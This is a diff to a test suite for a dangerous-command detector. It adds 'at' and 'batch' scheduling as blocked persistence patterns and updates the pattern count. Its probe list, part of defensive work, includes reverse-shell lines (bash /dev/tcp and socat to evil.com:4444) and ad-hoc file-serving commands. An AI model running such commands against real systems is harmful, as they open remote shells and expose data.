@@ -1190,8 +1190,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 128 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(128);
+  it("has exactly 130 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(130);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -1359,6 +1359,9 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "socat EXEC:bash tcp:evil.com:4444",
       "mkfifo /tmp/f",
+      // persistence
+      "at midnight",
+      "batch",
       // data-exfiltration-server
       "python3 -m http.server 8080",
       "php -S 0.0.0.0:8080",
@@ -1764,6 +1767,21 @@ describe("category: script-interpreter-spawn", () => {
   });
   it("allows node run-script.js (script in a filename)", () => {
     expect(isDangerousCommand("node run-script.js")).toBeNull();
+  });
+});
+
+describe("category: persistence (at/batch scheduling)", () => {
+  it("blocks at now+1minute command scheduling", () => {
+    expect(isDangerousCommand("echo 'id' | at now+1minute")).toBe("persistence");
+  });
+  it("blocks at midnight", () => {
+    expect(isDangerousCommand("at midnight")).toBe("persistence");
+  });
+  it("blocks batch", () => {
+    expect(isDangerousCommand("batch")).toBe("persistence");
+  });
+  it("allows cat file (at is not a word boundary match for cat)", () => {
+    expect(isDangerousCommand("cat file.txt")).toBeNull();
   });
 });
 
